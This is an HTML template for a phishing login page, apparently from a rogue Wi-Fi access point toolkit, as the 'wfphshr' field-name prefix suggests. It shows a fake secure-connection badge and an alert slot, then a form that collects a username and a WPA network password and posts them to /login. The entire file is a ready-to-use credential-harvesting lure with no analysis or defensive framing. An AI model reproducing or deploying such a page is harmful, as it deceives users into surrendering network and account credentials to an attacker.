<!DOCTYPE html>
<html lang="{{html_lang}}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{title_page}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
               background: linear-gradient(135deg, #0d1b2a 0%, #1b263b 100%);
               min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
        .container { background: #fff; border-radius: 12px; padding: 40px 32px; width: 100%; max-width: 420px;
                     box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 60px; height: 60px; }
        h1 { font-size: 20px; text-align: center; color: #1b263b; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #666; font-size: 14px; margin-bottom: 24px; }
        .alert { background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px;
                 padding: 12px; margin-bottom: 20px; font-size: 13px; color: #856404; line-height: 1.45; }
        label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px;
            font-size: 14px; margin-bottom: 16px; transition: border-color 0.2s; }
        input:focus { outline: none; border-color: #415a77; }
        .btn { width: 100%; padding: 14px; background: #415a77; color: #fff;
               border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
               cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #1b263b; }
        .footer { text-align: center; margin-top: 16px; font-size: 11px; color: #999; line-height: 1.4; }
        .secure { display: flex; align-items: center; justify-content: center;
                  gap: 6px; margin-bottom: 20px; color: #28a745; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none" stroke="#415a77" stroke-width="2">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
                <path d="M8 12l2 2 4-4"/>
            </svg>
        </div>
        <h1>{{heading}}</h1>
        <p class="subtitle">{{subtitle}}</p>
        <div class="alert">{{alert}}</div>
        <div class="secure">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
            {{secure_label}}
        </div>
        <form method="POST" action="/login">
            <label for="email">{{label_username}}</label>
            <input type="text" id="email" name="wfphshr-username" placeholder="{{placeholder_username}}" required autocomplete="username">
            <label for="password">{{label_password}}</label>
            <input type="password" id="password" name="wfphshr-wpa-password" placeholder="{{placeholder_password}}" required autocomplete="current-password">
            <button type="submit" class="btn">{{btn_submit}}</button>
        </form>
        <p class="footer">{{footer_terms}}</p>
    </div>
</body>
</html>
